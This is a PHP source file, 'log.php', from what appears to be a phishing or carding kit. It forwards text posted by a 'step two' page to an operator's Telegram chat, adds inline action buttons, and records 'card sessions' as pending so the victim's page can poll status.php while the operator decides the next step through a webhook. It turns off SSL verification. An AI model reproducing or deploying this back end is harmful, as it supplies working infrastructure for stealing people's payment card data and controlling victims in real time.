<?php
/**
 * log.php — Logger a Telegram con botones de acción + registro de sesiones de tarjeta.
 * Compatible con el frontend de paso-dos.php:
 *   POST { text, action?, session_id?, buttons? }
 *
 * - Lee credenciales Telegram desde admin/config.json (panel)
 * - Si hay session_id, registra la sesión en card_sessions.json como "pendiente"
 *   para que status.php la consulte y telegram-webhook.php la actualice.
 */
header('Content-Type: application/json; charset=utf-8');

require_once __DIR__ . '/includes/app-config.php';

$raw = file_get_contents('php://input');
$data = json_decode($raw, true) ?: [];

$text = trim($data['text'] ?? '');
$sessionId = preg_replace('/[^a-zA-Z0-9\-]/', '', $data['session_id'] ?? '');
$buttons = $data['buttons'] ?? null;

if ($text === '') {
    echo json_encode(['ok' => false, 'error' => 'text vacío']);
    exit;
}

$botToken = app_cfg('telegram.bot_token');
$chatId = app_cfg('telegram.chat_id_genericos');

$sent = false;
if ($botToken && $chatId) {
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    if (is_array($buttons) && count($buttons)) {
        $payload['reply_markup'] = ['inline_keyboard' => $buttons];
    }

    $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp = curl_exec($ch);
    $respData = json_decode($resp, true);
    $sent = !empty($respData['ok']);
    curl_close($ch);
}

// Registrar sesión de tarjeta para el flujo de polling (status.php)
if ($sessionId) {
    $file = __DIR__ . '/card_sessions.json';
    $sessions = file_exists($file) ? json_decode(file_get_contents($file), true) ?: [] : [];
    $sessions[$sessionId] = [
        'status' => 'pendiente',
        'updated' => date('c'),
        'text_preview' => mb_substr($text, 0, 120)
    ];
    @file_put_contents($file, json_encode($sessions, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

echo json_encode(['ok' => true, 'telegram_sent' => $sent]);
